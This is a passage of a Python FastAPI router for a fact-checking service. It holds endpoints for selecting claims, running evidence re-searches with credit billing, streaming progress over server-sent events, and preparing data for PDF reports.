                    "text": first_claim.text,
                    "position": first_claim.position,
                    "claimType": first_claim.claim_type,
                    "elementCount": (
                        len(claim_map.get("elements", [])) if claim_map else 0
                    ),
                    "orientation": claim_map.get("orientation") if claim_map else None,
                }
            )

        check_data.append(
            {
                "id": check.id,
                "inputType": check.input_type,
                "inputUrl": check.input_url,
                "status": check.status,
                "creditsUsed": check.credits_used,
                "processingTimeMs": check.processing_time_ms,
                "createdAt": check.created_at.isoformat(),
                "completedAt": (
                    check.completed_at.isoformat() if check.completed_at else None
                ),
                "claimsCount": claims_count,
                "claims": claims_array,  # First claim for preview
                "entryMode": check.entry_mode,
                "selectedClaimsCount": check.selected_claims_count,
                "articleDomain": check.article_domain,
            }
        )

    return {"checks": check_data, "total": total_count}


@router.get(
    "/{check_id}",
    summary="Get check with full evidence",
    responses={
        200: {
            "description": "Full check with claims, evidence, and claim maps",
            "model": CheckResponse,
        },
        404: {"description": "Check not found", "model": ErrorResponse},
    },
)
async def get_check(
    check_id: str,
    computed: bool = False,
    current_user: dict = Depends(get_current_user_or_api_key),
    session: AsyncSession = Depends(get_session),
):
    """
    Retrieve a completed check with all claims, elements, evidence, and claim maps.

    **Response includes:**
    - `claims[]` — extracted claims with type, position, element count
    - `claims[].claimMap` — elements, evidence refs, orientation line
    - `claims[].evidence[]` — sources with URL, snippet, tier, type, relevance
    - Check metadata: status, input URL, processing time, stage timings

    **Query params:**
    - `computed=true` — append `_computed` block with pre-computed analytics
      (tier/type distributions, corroboration groups, diagnostic values, timeline,
      element state summaries, per-claim dispositions). Designed for agent consumers
      who need structured analytics without client-side computation.

    Returns 404 if the check doesn't exist or doesn't belong to the authenticated user.
    """
    return await _build_check_response(check_id, current_user["id"], session, computed)


# ============================================================================
# CLAIM SELECTION ENDPOINT (Phase 1 → Phase 2 gate)
# ============================================================================


class SelectClaimsRequest(BaseModel):
    """Select claims for full evidence analysis (article mode)."""

    selected_positions: List[int] = Field(
        max_length=settings.MAX_SELECTED_CLAIMS,
        description=f"Claim positions to select for analysis (0-indexed). Maximum {settings.MAX_SELECTED_CLAIMS} claims per check.",
    )


@router.patch(
    "/{check_id}/select-claims",
    summary="Select claims for analysis",
    responses={
        200: {"description": "Selection accepted — Phase 2 pipeline resumed via SSE"},
        400: {
            "description": "Invalid selection or too many claims",
            "model": ErrorResponse,
        },
        404: {"description": "Check not found", "model": ErrorResponse},
        409: {
            "description": "Check is not in waiting_for_selection state",
            "model": ErrorResponse,
        },
    },
)
async def select_claims(
    check_id: str,
    body: SelectClaimsRequest,
    current_user: dict = Depends(get_current_user_or_api_key),
    session: AsyncSession = Depends(get_session),
):
    """
    Select claims for full analysis (article mode only).

    When a URL/article check pauses with status `waiting_for_selection`,
    call this endpoint with the positions of claims to investigate.
    Triggers Phase 2: evidence retrieval, decomposition, and mapping.

    **Request body:** `{"selected_positions": [0, 2, 4]}`

    Max 5 claims per check. The check resumes streaming progress via
    `GET /checks/{id}/progress`.
    """
    from app.core.database import async_session as async_session_factory
    from app.pipeline.progress import ProgressReporter
    from app.pipeline.runner import (
        run_pipeline_phase2,
        save_check_results_async,
        handle_pipeline_failure,
        send_success_notifications,
        PipelineError,
    )

    # 1. Validate check exists and belongs to user
    stmt = select(Check).where(
        Check.id == check_id, Check.user_id == current_user["id"]
    )
    result = await session.execute(stmt)
    check = result.scalar_one_or_none()

    if not check:
        raise HTTPException(status_code=404, detail="Check not found")

    # 2. Validate check is in waiting_for_selection status
    if check.status != "waiting_for_selection":
        raise HTTPException(
            status_code=409,
            detail=f"Check is not waiting for claim selection (current status: {check.status})",
        )

    # 3. Validate selected_positions
    if not body.selected_positions:
        raise HTTPException(
            status_code=400, detail="At least one claim must be selected"
        )

    # Load claims to validate positions
    claims_stmt = (
        select(Claim).where(Claim.check_id == check_id).order_by(Claim.position)
    )
    claims_result = await session.execute(claims_stmt)
    db_claims = list(claims_result.scalars().all())

    valid_positions = {c.position for c in db_claims}
    invalid_positions = [p for p in body.selected_positions if p not in valid_positions]

    if invalid_positions:
        raise HTTPException(
            status_code=400,
            detail=f"Invalid claim positions: {invalid_positions}. Valid: {sorted(valid_positions)}",
        )

    # 4. Update claim selection in DB
    selected_set = set(body.selected_positions)
    for claim in db_claims:
        claim.is_selected = claim.position in selected_set

    check.selected_claims_count = len(selected_set)

    await session.commit()

    logger.info(
        f"[SELECT CLAIMS] Check {check_id}: user selected positions {body.selected_positions} "
        f"({len(selected_set)} of {len(db_claims)} claims)"
    )

    # 5. Trigger Phase 2 as a background task
    input_content = json.loads(check.input_content) if check.input_content else {}
    input_data = {
        "input_type": check.input_type,
        "content": input_content.get("content"),
        "url": input_content.get("url") or check.input_url,
        "file_path": input_content.get("file_path"),
        "user_query": check.user_query,
    }

    progress_reporter = ProgressReporter(check_id)

    async def run_phase2_and_save():
        inflight_register(check_id)  # deploy-shutdown guard (2026-07-21)
        try:
            logger.info(f"[PHASE 2 TASK] Starting phase 2 for check {check_id}")
            phase2_result = await asyncio.wait_for(
                run_pipeline_phase2(
                    check_id=check_id,
                    user_id=current_user["id"],
                    input_data=input_data,
                    progress_reporter=progress_reporter,
                ),
                timeout=300,
            )

            # Save results
            async with async_session_factory() as save_session:
                await save_check_results_async(check_id, phase2_result, save_session)
                await save_session.commit()

            logger.info(f"[PHASE 2 TASK] Results saved for check {check_id}")

            # Send notifications
            content_data = {"metadata": phase2_result.get("ingest_metadata", {})}
            await send_success_notifications(
                current_user["id"], check_id, phase2_result, input_data, content_data
            )

            await progress_reporter.report_completed()
            logger.info(f"[PHASE 2 TASK] Check {check_id} fully completed")

        except asyncio.TimeoutError:
            logger.error(f"[PHASE 2 TASK] Phase 2 timed out for check {check_id}")
            await handle_pipeline_failure(
                check_id,
                current_user["id"],
                Exception("Analysis timed out after 5 minutes"),
            )
            await progress_reporter.report_error(
                "Analysis timed out. Your credit has been returned."
            )

        except PipelineError as e:
            logger.error(f"[PHASE 2 TASK] Pipeline error for check {check_id}: {e}")
            await handle_pipeline_failure(check_id, current_user["id"], e)
            await progress_reporter.report_error(str(e))

        except Exception as e:
            logger.error(f"[PHASE 2 TASK] Unexpected error for check {check_id}: {e}")
            import traceback

            logger.error(traceback.format_exc())
            await handle_pipeline_failure(check_id, current_user["id"], e)
            await progress_reporter.report_error(str(e))

        finally:
            inflight_unregister(check_id)

    # Supervised (hang-proofing W1): phase 2 previously had NO ceiling at all.
    supervise_pipeline_task(
        run_phase2_and_save(),
        check_id=check_id,
        user_id=current_user["id"],
        label="phase-2 pipeline",
    )

    return {
        "status": "processing",
        "checkId": check_id,
        "selectedPositions": body.selected_positions,
        "selectedCount": len(selected_set),
        "message": "Analysis started for selected claims",
    }


# ============================================================================
# BOUNTY TEXT ENDPOINT (G01: The Seeker)
# ============================================================================


class UpdateBountyRequest(BaseModel):
    """Update the bounty text on a claim element (Seeker feature)."""

    text: Optional[str] = Field(
        None,
        description="Bounty text describing what evidence would help resolve this element (max 200 chars). Set to null to clear.",
    )


@router.patch(
    "/{check_id}/claims/{claim_id}/elements/{element_id}/bounty",
    summary="Update element bounty text",
    responses={
        200: {"description": "Bounty text updated", "model": BountyUpdateResponse},
        400: {
            "description": "Text exceeds 200 character limit",
            "model": ErrorResponse,
        },
        404: {
            "description": "Check, claim, or element not found",
            "model": ErrorResponse,
        },
        409: {"description": "Check is not completed", "model": ErrorResponse},
    },
)
async def update_bounty_text(
    check_id: str,
    claim_id: str,
    element_id: str,
    body: UpdateBountyRequest,
    current_user: dict = Depends(get_current_user_or_api_key),
    session: AsyncSession = Depends(get_session),
):
    """Update bounty text on a specific claim element (Seeker feature).

    Bounty text signals what evidence would help resolve an unresolved element.
    Set to null to clear.
    """
    # 1. Validate check exists + user owns it
    stmt = select(Check).where(
        Check.id == check_id, Check.user_id == current_user["id"]
    )
    result = await session.execute(stmt)
    check = result.scalar_one_or_none()

    if not check:
        raise HTTPException(status_code=404, detail="Check not found")

    if check.status != "completed":
        raise HTTPException(
            status_code=409,
            detail="Bounty text can only be set on completed checks",
        )

    # 2. Validate text length
    if body.text and len(body.text) > 200:
        raise HTTPException(
            status_code=400,
            detail="Bounty text must be 200 characters or less",
        )

    # 3. Load claim
    claim_stmt = (
        select(Claim)
        .where(Claim.id == claim_id, Claim.check_id == check_id)
        .with_for_update()
    )
    claim_result = await session.execute(claim_stmt)
    db_claim = claim_result.scalar_one_or_none()

    if not db_claim:
        raise HTTPException(status_code=404, detail="Claim not found")

    # 4. Parse claim_map and find element
    claim_map = db_claim.claim_map
    if isinstance(claim_map, str):
        claim_map = json.loads(claim_map)

    if not claim_map or not isinstance(claim_map, dict):
        raise HTTPException(status_code=404, detail="Claim map not found")

    elements = claim_map.get("elements", [])
    element_found = False
    for elem in elements:
        if elem.get("element_id") == element_id:
            elem["bounty_text"] = body.text.strip() if body.text else None
            element_found = True
            break

    if not element_found:
        raise HTTPException(status_code=404, detail=f"Element {element_id} not found")

    # 5. Write back and commit
    db_claim.claim_map = claim_map
    from sqlalchemy.orm.attributes import flag_modified

    flag_modified(db_claim, "claim_map")

    await session.commit()

    return {
        "status": "success",
        "bountyText": body.text.strip() if body.text else None,
    }


# ============================================================================
# ELEMENT RE-SEARCH ENDPOINTS (G02: Re-Search Mechanism)
# ============================================================================


async def _reserve_re_search_credit(
    session: AsyncSession, current_user: dict, *, kind: str, check_id: str
):
    """Gate + debit 1 credit for a re-search/top-up run, then commit.

    Ledger-backed (usage_ledger.reserve_usage): the debit lands in the same
    period sum the monthly gate reads, so subscriber re-searches count
    against the plan. Committed BEFORE the background work is launched —
    a failed debit must never leave the pipeline running unbilled.
    """
    user = await get_or_create_user(session, current_user)
    user = await reserve_usage(
        session, user, kind=kind, check_id=check_id, context="re_search"
    )
    await session.commit()

    # Trial exhausted — second trigger point. Re-searches and top-ups debit
    # credits but never reach send_success_notifications, so without this a
    # user could spend their last credit here and never be told. The marker
    # makes double-wiring safe: whichever trigger fires first claims it.
    from app.services.lifecycle_emails import schedule_trial_exhausted_email

    schedule_trial_exhausted_email(user.id)

    return user


async def _start_research_operation(
    check_id, claim_id, request, current_user, session, mode, element_id=None
):
    _require_console_submission(request)
    from app.services.research_operations import admit_research, launch_operation

    user = await get_or_create_user(session, current_user)
    request_key = request.headers.get("Idempotency-Key") or str(uuid.uuid4())
    operation, created = await admit_research(
        session, user, check_id, claim_id, mode, request_key, element_id
    )
    await session.commit()  # admission + debit are durable before dispatch
    if created:
        launch_operation(operation.id)
        from app.services.lifecycle_emails import schedule_trial_exhausted_email

        schedule_trial_exhausted_email(user.id)
    return {
        "status": "started",
        "message": operation.message,
        "operationId": operation.id,
        "checkId": check_id,
        "claimId": claim_id,
        "elementIds": operation.element_ids,
        "elementId": element_id,
        "gapCount": len(operation.element_ids),
        "thinCount": len(operation.element_ids),
        "creditsUsed": 1 if created else 0,
    }


@router.post(
    "/{check_id}/claims/{claim_id}/research-gaps",
    summary="Research all gap elements as one operation",
)
async def start_gap_research(
    check_id: str,
    claim_id: str,
    request: Request,
    current_user: dict = Depends(get_current_user_or_api_key),
    session: AsyncSession = Depends(get_session),
):
    return await _start_research_operation(
        check_id, claim_id, request, current_user, session, "gaps"
    )


@router.post(
    "/{check_id}/claims/{claim_id}/research-thin",
    summary="Strengthen thin elements as one operation",
)
async def start_thin_research(
    check_id: str,
    claim_id: str,
    request: Request,
    current_user: dict = Depends(get_current_user_or_api_key),
    session: AsyncSession = Depends(get_session),
):
    return await _start_research_operation(
        check_id, claim_id, request, current_user, session, "thin"
    )


@router.post(
    "/{check_id}/claims/{claim_id}/elements/{element_id}/research",
    summary="Research an element",
)
async def start_element_research(
    check_id: str,
    claim_id: str,
    element_id: str,
    request: Request,
    current_user: dict = Depends(get_current_user_or_api_key),
    session: AsyncSession = Depends(get_session),
):
    return await _start_research_operation(
        check_id, claim_id, request, current_user, session, "element", element_id
    )


@router.get(
    "/{check_id}/claims/{claim_id}/elements/{element_id}/research/status",
    summary="Get durable research status",
)
async def get_element_research_status(
    check_id: str,
    claim_id: str,
    element_id: str,
    operation_id: Optional[str] = None,
    current_user: dict = Depends(get_current_user_or_api_key),
    session: AsyncSession = Depends(get_session),
):
    from app.models import ResearchOperation
    from app.models.check import _utcnow_naive
    from app.services.research_operations import ACTIVE, status_payload, fail_operation

    check = (
        await session.execute(
            select(Check).where(
                Check.id == check_id, Check.user_id == current_user["id"]
            )
        )
    ).scalar_one_or_none()
    if not check:
        raise HTTPException(404, "Check not found")
    query = select(ResearchOperation).where(
        ResearchOperation.check_id == check_id,
        ResearchOperation.claim_id == claim_id,
        ResearchOperation.element_ids.contains([element_id]),
    )
    if operation_id:
        query = query.where(ResearchOperation.id == operation_id)
    operation = (
        await session.execute(
            query.order_by(ResearchOperation.created_at.desc()).limit(1)
        )
    ).scalar_one_or_none()
    if operation:
        if operation.status in ACTIVE and operation.deadline_at <= _utcnow_naive():
            await fail_operation(
                operation.id, "Research timed out. Your credit has been refunded."
            )
            await session.refresh(operation)
        return status_payload(operation)
    if operation_id:
        raise HTTPException(404, "Research operation not found")
    from app.pipeline.re_search import get_research_status

    return get_research_status(check_id, claim_id, element_id) or {
        "status": "idle",
        "message": "No research in progress",
    }


@router.get("/{check_id}/revisions", summary="List retained report revisions")
async def list_report_revisions(
    check_id: str,
    current_user: dict = Depends(get_current_user_or_api_key),
    session: AsyncSession = Depends(get_session),
):
    from app.models import ReportRevision

    check = (
        await session.execute(
            select(Check).where(
                Check.id == check_id, Check.user_id == current_user["id"]
            )
        )
    ).scalar_one_or_none()
    if not check:
        raise HTTPException(404, "Check not found")
    rows = (
        (
            await session.execute(
                select(ReportRevision)
                .where(ReportRevision.check_id == check_id)
                .order_by(ReportRevision.created_at, ReportRevision.id)
            )
        )
        .scalars()
        .all()
    )
    return {
        "revisions": [
            {
                "id": row.id,
                "operationId": row.operation_id,
                "phase": row.phase,
                "createdAt": row.created_at.isoformat(),
                "signedAt": (row.snapshot.get("manifest") or {}).get("signed_at"),
            }
            for row in rows
        ]
    }


@router.get(
    "/{check_id}/revisions/{revision_id}", summary="Read a retained report revision"
)
async def get_report_revision(
    check_id: str,
    revision_id: str,
    current_user: dict = Depends(get_current_user_or_api_key),
    session: AsyncSession = Depends(get_session),
):
    from app.models import ReportRevision

    check = (
        await session.execute(
            select(Check).where(
                Check.id == check_id, Check.user_id == current_user["id"]
            )
        )
    ).scalar_one_or_none()
    if not check:
        raise HTTPException(404, "Check not found")
    row = (
        await session.execute(
            select(ReportRevision).where(
                ReportRevision.id == revision_id, ReportRevision.check_id == check_id
            )
        )
    ).scalar_one_or_none()
    if not row:
        raise HTTPException(404, "Revision not found")
    return {"id": row.id, "phase": row.phase, "snapshot": row.snapshot}


# ============================================================================
# SEEKER EXPLORE MODE — Related claims from other users
# ============================================================================


@router.get(
    "/{check_id}/claims/{claim_id}/explore",
    summary="Get related claims for Seeker explore mode",
    responses={
        200: {"description": "Related claims from other users"},
        404: {"description": "Check or claim not found", "model": ErrorResponse},
    },
)
async def get_explore_data(
    check_id: str,
    claim_id: str,
    current_user: dict = Depends(get_current_user_or_api_key),
    session: AsyncSession = Depends(get_session),
):
    """Surface related claims investigated by other users.

    Used by the Seeker view when no evidence gaps remain. Returns normalised
    claim text + element descriptions from related checks. Privacy-safe:
    no user IDs, no check IDs, no individual evidence items.

    Relatedness is determined by shared key_entities (preferred) with
    subject_context fallback.
    """
    # Validate check ownership
    stmt = select(Check).where(
        Check.id == check_id, Check.user_id == current_user["id"]
    )
    result = await session.execute(stmt)
    check = result.scalar_one_or_none()

    if not check:
        raise HTTPException(status_code=404, detail="Check not found")

    # Validate claim belongs to this check
    claim_stmt = select(Claim).where(Claim.id == claim_id, Claim.check_id == check_id)
    claim_result = await session.execute(claim_stmt)
    db_claim = claim_result.scalar_one_or_none()

    if not db_claim:
        raise HTTPException(status_code=404, detail="Claim not found")

    from app.services.explore import find_related_claims, build_explore_response

    related = await find_related_claims(
        claim_id=claim_id,
        user_id=current_user["id"],
        session=session,
    )

    return build_explore_response(related)


@router.post(
    "/{check_id}/sse-token",
    summary="Generate short-lived SSE stream token",
    responses={
        200: {"description": "SSE stream token", "model": SSETokenResponse},
        404: {"description": "Check not found", "model": ErrorResponse},
    },
)
async def create_sse_token(
    check_id: str,
    current_user: dict = Depends(get_current_user_or_api_key),
    session: AsyncSession = Depends(get_session),
):
    """
    Generate a short-lived, check-scoped token for SSE progress streaming.

    Use this token as `?token=<token>` in the `GET /progress` EventSource URL
    instead of passing the full JWT in the query string.

    Token is valid for 5 minutes and scoped to the specified check ID.
    """
    # Verify check belongs to user
    stmt = select(Check).where(
        Check.id == check_id, Check.user_id == current_user["id"]
    )
    result = await session.execute(stmt)
    check = result.scalar_one_or_none()

    if not check:
        raise HTTPException(status_code=404, detail="Check not found")

    # Generate token and store in Redis
    stream_token = secrets.token_urlsafe(32)
    token_key = f"sse-token:{stream_token}"
    token_payload = json.dumps(
        {
            "check_id": check_id,
            "user_id": current_user["id"],
        }
    )

    try:
        redis_client = aioredis.from_url(settings.REDIS_URL, decode_responses=True)
        await redis_client.setex(token_key, 300, token_payload)  # 5 minute TTL
        await redis_client.aclose()
    except Exception as e:
        logger.error(f"Failed to store SSE token in Redis: {e}")
        raise HTTPException(status_code=500, detail="Failed to generate stream token")

    return {"token": stream_token, "expiresIn": 300}


@router.get("/{check_id}/progress", summary="Stream pipeline progress (SSE)")
async def stream_check_progress(
    check_id: str,
    current_user: dict = Depends(get_current_user_or_api_key_sse),
):
    """
    Stream real-time pipeline progress via Server-Sent Events.

    **SSE events:** `progress` (stage/percent), `awaiting_selection`,
    `completed`, `error`. Connection auto-closes on completion or after 5 min timeout.

    **Auth:** Accepts `X-API-Key` header or `?token=<jwt>` query param
    (EventSource can't set headers).
    """

    # Verify check belongs to user. Deliberately NOT a Depends(get_session):
    # a dependency session stays checked out for the STREAM's lifetime (up to
    # 5 min), and reconnect loops on a dead check starved the pool into an
    # API-wide brownout (2026-07-21 outage). Short-lived session, released
    # before streaming starts; the generator only needs Redis + these fields.
    from app.core.database import async_session  # local import, matches module style

    async with async_session() as session:
        stmt = select(Check).where(
            Check.id == check_id, Check.user_id == current_user["id"]
        )
        result = await session.execute(stmt)
        check = result.scalar_one_or_none()

        if not check:
            raise HTTPException(status_code=404, detail="Check not found")

        # Snapshot before the session closes — the generator runs detached.
        check_status = check.status
        check_error = check.error_message

    def event_stream():
        """Generate SSE events for pipeline progress - reads from Redis"""
        import time

        redis_client = None
        try:
            redis_client = redis.from_url(settings.REDIS_URL, decode_responses=True)
            progress_key = f"inline-progress:{check_id}"

            # Initial connection event
            yield f"data: {safe_json_dumps({'type': 'connected', 'checkId': check_id, 'timestamp': datetime.now(timezone.utc).isoformat()})}\n\n"

            # Check if already completed/failed/awaiting in database
            if check_status == "completed":
                yield f"data: {json.dumps({'type': 'completed', 'checkId': check_id, 'status': 'completed', 'progress': 100})}\n\n"
                return
            elif check_status == "failed":
                yield f"data: {safe_json_dumps({'type': 'error', 'checkId': check_id, 'status': 'failed', 'error': check_error})}\n\n"
                return
            elif check_status == "waiting_for_selection":
                claims_key = f"inline-progress:{check_id}:claims"
                claims_json = redis_client.get(claims_key)
                claims = json.loads(claims_json) if claims_json else []
                yield f"data: {json.dumps({'type': 'awaiting_selection', 'checkId': check_id, 'stage': 'awaiting_selection', 'progress': 30, 'message': 'Waiting for claim selection...', 'claims': claims})}\n\n"
                # Don't return — fall through to polling loop so Phase 2
                # progress events are streamed after claim selection.
                _initial_awaiting = True
            else:
                _initial_awaiting = False

            # Poll Redis for inline pipeline progress
            last_progress = 30 if _initial_awaiting else -1
            last_stage = "awaiting_selection" if _initial_awaiting else ""
            timeout_counter = 0
            max_timeout = 300  # 5 minutes
            # Current state (persists between iterations for heartbeats)
            current_stage = "starting"
            current_progress = 0
            current_message = "Initializing..."
            current_time_estimate = "within 2 minutes"

            while timeout_counter < max_timeout:
                try:
                    # Read progress from Redis (written by ProgressReporter)
                    progress_data = redis_client.get(progress_key)

                    if progress_data:
                        data = json.loads(progress_data)
                        status = data.get("status", "processing")
                        current_progress = data.get("progress", 0)
                        current_stage = data.get("stage", "processing")
                        current_message = data.get("message", "Processing...")
                        current_time_estimate = data.get(
                            "timeEstimate", "within 2 minutes"
                        )

                        if status == "completed":
                            yield f"data: {json.dumps({'type': 'completed', 'checkId': check_id, 'status': 'completed', 'progress': 100, 'message': 'Analysis completed successfully'})}\n\n"
                            break
                        elif status == "failed":
                            error = data.get("error", "Processing failed")
                            yield f"data: {safe_json_dumps({'type': 'error', 'checkId': check_id, 'status': 'failed', 'error': error})}\n\n"
                            break
                        elif status == "waiting_for_selection":
                            # Send awaiting_selection only once, then keep
                            # polling so Phase 2 events are streamed.
                            if last_stage != "awaiting_selection":
                                claims_key = f"inline-progress:{check_id}:claims"
                                claims_json = redis_client.get(claims_key)
                                claims = json.loads(claims_json) if claims_json else []
                                yield f"data: {json.dumps({'type': 'awaiting_selection', 'checkId': check_id, 'stage': 'awaiting_selection', 'progress': 30, 'message': 'Waiting for claim selection...', 'claims': claims})}\n\n"
                                last_stage = "awaiting_selection"
                                last_progress = 30
                        elif (
                            current_progress > last_progress
                            or current_stage != last_stage
                        ):
                            # Send progress update when progress OR stage changes
                            yield f"data: {json.dumps({'type': 'progress', 'checkId': check_id, 'stage': current_stage, 'progress': current_progress, 'message': current_message, 'timeEstimate': current_time_estimate})}\n\n"
                            last_progress = current_progress
                            last_stage = current_stage

                    # Send progress-heartbeat every 5 seconds to keep frontend in sync
                    # Include current progress so frontend always has latest state
                    if timeout_counter > 0 and timeout_counter % 5 == 0:
                        yield f"data: {json.dumps({'type': 'progress', 'checkId': check_id, 'stage': current_stage, 'progress': current_progress, 'message': current_message, 'timeEstimate': current_time_estimate})}\n\n"

                    time.sleep(1)
                    timeout_counter += 1

                except Exception as e:
                    logger.error(f"SSE error for check {check_id}: {e}")
                    yield f"data: {json.dumps({'type': 'error', 'error': 'Connection error occurred'})}\n\n"
                    break

            # Timeout reached
            if timeout_counter >= max_timeout:
                yield f"data: {json.dumps({'type': 'timeout', 'checkId': check_id, 'message': 'Connection timeout - please refresh'})}\n\n"

        except Exception as e:
            logger.error(f"SSE stream error: {e}")
            yield f"data: {json.dumps({'type': 'error', 'error': 'Stream connection failed'})}\n\n"
        finally:
            if redis_client:
                redis_client.close()

    return StreamingResponse(
        event_stream(),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Connection": "keep-alive",
            "X-Accel-Buffering": "no",  # Disable nginx buffering for SSE
        },
    )


# Question-shaped elements read Addressed / Contested / Context only / Open
# (a question cannot be "supported"). PARITY-LOCKED with
# shared/constants/index.ts::QUESTION_STATE_LABELS — the test reads both.
QUESTION_STATE_LABELS = {
    "supported": "Addressed",
    "disputed": "Contested",
    "contextual": "Context only",
    "unresolved": "Open",
}


def _is_question_element(description) -> bool:
    return isinstance(description, str) and description.strip().endswith("?")


def _element_state_label(element: dict) -> str:
    """The word the PDF prints for the state: the question form for a
    question-shaped element, otherwise the state itself (the template still
    substitutes "challenged" for a challenges-only disputed element)."""
    state = str(element.get("state") or "")
    if _is_question_element(element.get("description")):
        return QUESTION_STATE_LABELS.get(state, state)
    return state


def _element_quality_notes(element: dict) -> list[dict]:
    """Per-element thin/echo/repetition notes for the PDF (parity-locked to the
    frontend via ``side_quality_note``), one per side that carries a note and
    tagged with the side label. Grey, structural — never a verdict."""
    if not isinstance(element, dict):
        return []
    basis = element.get("basis") or {}
    notes: list[dict] = []
    for side_key, side_label in (
        ("support_structure", "Support"),
        ("challenge_structure", "Challenge"),
    ):
        note = side_quality_note(basis.get(side_key))
        if note:
            notes.append({"side": side_label, **note})
    return notes


_SCOPE_NOTE_LABELS = {
    "temporal_scope": "a different period",
    "jurisdiction_scope": "another country's official source",
    "measure_scope": "a different interval",
    "date_scope": "a different day of the same month",
    "interested_party": "the claimant's own organ",
    "recital_scope": "reports the claim rather than making it",
    "same_study_scope": "another host of a study already counted",
    "echo_scope": "a copy of a source already counted",
    "fact_applicability": "time applicability not established in the retained text",
    "relationship_scope": "scope review",
}


def _element_passage_basis(
    element: dict, evidence_by_id: dict, evidence_index: dict
) -> list[dict]:
    """Exact quoted passages behind each relationship, for the PDF (Track Q
    step 8, 2026-09-09). A quote renders ONLY when it re-validates against the
    captured extraction the citation names (same version hash, literal text
    in the retained passage) — the web ``citationText`` rule. A paraphrase or
    a stale citation renders nothing; the relationship stays a system
    interpretation either way."""
    from app.services.passage_mapping import valid_passages, validate_citations

    out: list[dict] = []
    if not isinstance(element, dict):
        return out
    for ref in element.get("evidence_refs") or []:
        if not isinstance(ref, dict) or not ref.get("citations"):
            continue
        ev = evidence_by_id.get(ref.get("evidence_id"))
        receipt = getattr(ev, "text_provenance", None) if ev is not None else None
        if not isinstance(receipt, dict):
            continue
        digest = receipt.get("extraction_sha256")
        if any(
            c.get("extraction_sha256") != digest
            for c in ref["citations"]
            if isinstance(c, dict)
        ):
            continue
        pair = {
            "passages": valid_passages({"text_provenance": receipt}),
            "evidence": {"text_provenance": receipt},
        }
        validated = validate_citations(ref["citations"], pair)
        quotes = [c["quote"] for c in (validated or []) if c.get("quote")]
        if quotes:
            out.append(
                {
                    "ref_num": evidence_index.get(ref.get("evidence_id"), 0),
                    "relationship": ref.get("relationship"),
                    "quotes": quotes,
                }
            )
    return out


def _element_scope_notes(element: dict, evidence_index: dict) -> list[dict]:
    """Every reference a mechanical gate or the scope review re-labelled to
    context, with its reason — the receipts already in the element basis
    (invariant #5), rendered grey and structural. Model-written reasoning
    passes the same verdict-language rule as the web (parity-locked)."""
    from app.pipeline.claim_map_analyzer import _SCOPE_RECEIPT_KEYS
    from app.utils.verdict_language import public_note

    notes: list[dict] = []
    if not isinstance(element, dict):
        return notes
    basis = element.get("basis") or {}
    for key in _SCOPE_RECEIPT_KEYS:
        receipt = basis.get(key)
        if not isinstance(receipt, dict):
            continue
        for entry in receipt.get("scoped") or []:
            if not isinstance(entry, dict):
                continue
            detail = ""
            counted = entry.get("counted_as") or entry.get("original_id")
            if counted:
                detail = f"counted as source {evidence_index.get(counted, '?')}"
            elif key == "temporal_scope" and entry.get("element_period"):
                detail = f"element period {entry['element_period']}"
            elif key == "relationship_scope":
                detail = public_note(entry.get("reasoning"))
            elif entry.get("reason"):
                detail = str(entry["reason"])
            notes.append(
                {
                    "ref_num": evidence_index.get(entry.get("evidence_id"), 0),
                    "was": entry.get("was")
                    or (entry.get("original_ref") or {}).get("relationship")
                    or "",
                    "label": _SCOPE_NOTE_LABELS.get(key, key.replace("_", " ")),
                    "detail": detail,
                }
            )
    return notes


def _claim_stance_counts(elements: list) -> dict:
    """Aggregate a claim's evidence stance across its elements' refs. Neutral
    disposition of the evidence (supports/context/challenges) — not a verdict."""
    counts = {"supports": 0, "challenges": 0, "context": 0}
    for el in elements or []:
        if not isinstance(el, dict):
            continue
        for ref in el.get("evidence_refs") or []:
            if not isinstance(ref, dict):
                continue
            rel = ref.get("relationship")
            if rel == "supports":
                counts["supports"] += 1
            elif rel == "challenges":
                counts["challenges"] += 1
            else:
                counts["context"] += 1
    return counts


async def _build_check_pdf_bytes(check: Check, session: AsyncSession) -> bytes:
    """Render a completed check to PDF bytes. Shared by the owner and public export routes."""
    # Fetch claims ordered by position
    claims_stmt = (
        select(Claim).where(Claim.check_id == check.id).order_by(Claim.position)
    )
    claims_result = await session.execute(claims_stmt)
    claims = claims_result.scalars().all()

    # Fetch ALL evidence for each claim (ordered by relevance)
    claims_with_evidence = []
    snapshot_rows = []
    tier_counts = {"primary": 0, "reporting": 0, "commentary": 0}
    type_counts: dict[str, int] = {}

    for claim in claims:
        evidence_stmt = (
            select(Evidence)
            .where(Evidence.claim_id == claim.id)
            .order_by(desc(Evidence.relevance_score))
        )
        evidence_result = await session.execute(evidence_stmt)
        evidence_list = evidence_result.scalars().all()
        snapshot_rows.append((claim, evidence_list))

        # Build per-claim evidence index: evidence_id → 1-based number
        evidence_index: dict[str, int] = {}
        for idx, ev in enumerate(evidence_list, 1):
            ev_id = ev.evidence_id or str(ev.id)
            evidence_index[ev_id] = idx
            # Accumulate tier/type counts
            tier = ev.tier or "commentary"
            tier_counts[tier] = tier_counts.get(tier, 0) + 1
            if ev.evidence_type:
                type_counts[ev.evidence_type] = type_counts.get(ev.evidence_type, 0) + 1

        claim_map = copy.deepcopy(claim.claim_map) if claim.claim_map else None
        elements = claim_map.get("elements", []) if claim_map else []
        # Pre-compute presentation reads (like tier_counts) so Jinja stays dumb.
        evidence_by_id = {(ev.evidence_id or str(ev.id)): ev for ev in evidence_list}
        for el in elements:
            if isinstance(el, dict):
                el["quality_notes"] = _element_quality_notes(el)
                el["state_label"] = _element_state_label(el)
                el["passage_basis"] = _element_passage_basis(
                    el, evidence_by_id, evidence_index
                )
                el["scope_notes"] = _element_scope_notes(el, evidence_index)
        claims_with_evidence.append(
            {
                "text": claim.text,
                "claim_type": claim.claim_type,
                "claim_map": claim_map,
                "orientation": claim_map.get("orientation") if claim_map else None,
                "elements": elements,
                "stance": _claim_stance_counts(elements),
                "evidence": evidence_list,
                "evidence_index": evidence_index,
            }
        )

    # Pre-compute totals for template (avoids broken Jinja2 sum filter on nested lists)
    total_evidence = sum(len(c.get("evidence", [])) for c in claims_with_evidence)
    total_elements = sum(len(c.get("elements", [])) for c in claims_with_evidence)
    from app.services.report_revisions import snapshot_from_rows, identify_snapshot

    report_identity = await identify_snapshot(
        session, snapshot_from_rows(check, snapshot_rows)
    )
    verify_url = f"{settings.FRONTEND_URL.rstrip('/')}/verify/{check.id}"
    if report_identity["revisionId"]:
        verify_url += f"?revision={report_identity['revisionId']}"

    # Render HTML template
    try:
